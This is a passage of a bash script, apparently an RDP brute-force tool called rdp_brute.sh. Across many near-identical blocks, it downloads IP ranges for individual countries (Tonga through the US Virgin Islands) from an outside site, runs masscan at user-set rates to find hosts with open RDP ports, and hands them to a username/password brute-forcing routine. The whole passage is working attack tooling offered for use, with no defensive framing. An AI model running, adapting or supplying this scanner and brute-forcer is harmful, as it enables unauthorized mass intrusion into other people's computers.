rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "184" ]; then
curl http://ipdiapazon.16mb.com/Tonga.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "185" ]; then
curl http://ipdiapazon.16mb.com/Trinidad.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "186" ]; then
curl http://ipdiapazon.16mb.com/Tunisia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "187" ]; then
curl http://ipdiapazon.16mb.com/Turkey.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "188" ]; then
curl http://ipdiapazon.16mb.com/Turkmenistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "189" ]; then
curl http://ipdiapazon.16mb.com/Tuvalu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "190" ]; then
curl http://ipdiapazon.16mb.com/Uganda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "191" ]; then
curl http://ipdiapazon.16mb.com/Ukraine.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "192" ]; then
curl http://ipdiapazon.16mb.com/United.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "193" ]; then
curl http://ipdiapazon.16mb.com/United_kingdom.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "194" ]; then
curl http://ipdiapazon.16mb.com/United_states.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "195" ]; then
curl http://ipdiapazon.16mb.com/Uruguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "196" ]; then
curl http://ipdiapazon.16mb.com/Uzbekistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "197" ]; then
curl http://ipdiapazon.16mb.com/Vanuatu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "198" ]; then
curl http://ipdiapazon.16mb.com/Venezuela.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "199" ]; then
curl http://ipdiapazon.16mb.com/Viet_nam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "200" ]; then
curl http://ipdiapazon.16mb.com/Virgin_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "201" ]; then
curl http://ipdiapazon.16mb.com/Virgin_islands_u.s.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
